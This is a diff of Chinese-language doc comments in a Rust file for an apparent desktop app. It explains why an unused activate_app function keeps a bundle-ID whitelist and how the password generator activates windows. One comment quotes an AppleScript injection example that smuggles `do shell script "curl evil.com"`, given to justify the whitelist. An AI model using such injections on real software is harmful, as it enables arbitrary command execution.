@@ -61,8 +61,12 @@ pub const OCTOPUS_BUNDLE_ID: &str = "com.octopus.desktop";
 /// `^[A-Za-z0-9.\-]{1,256}$`——只允许字母/数字/`.`/`-`，长度 1-256。
 /// 防止任意字符注入 AppleScript（如 `x") & "do shell script \"curl evil.com\"" & ("`）。
 ///
-/// 当前 activate_app 是 dead code（无生产调用），但未来 Actionbar 集成密码生成器
-/// 独立窗口等场景会用到——白名单作为防御性校验，启用前先就位。
+/// 当前 activate_app 是 dead code（无生产调用）。
+///
+/// **ActionBar 密码生成器已实现**（2026-07-19 落地）但没用 activate_app——
+/// 走的是 `password_generator_autotype` → `autotype_login` → `autotype_login_with_mode`
+/// 内部的 osascript activate frontmost 路径（L166-181），不经过此函数。
+/// activate_app 的 NSRunningApplication.activate 方案作为备用预留，当前无消费方。
 ///
 /// 2026-07-21 perf：从 osascript 改用 NSRunningApplication.activate（< 1ms vs ~200ms）。
 /// bundle_id 白名单校验仍保留（虽然不再有注入风险——objc2 不拼字符串）。
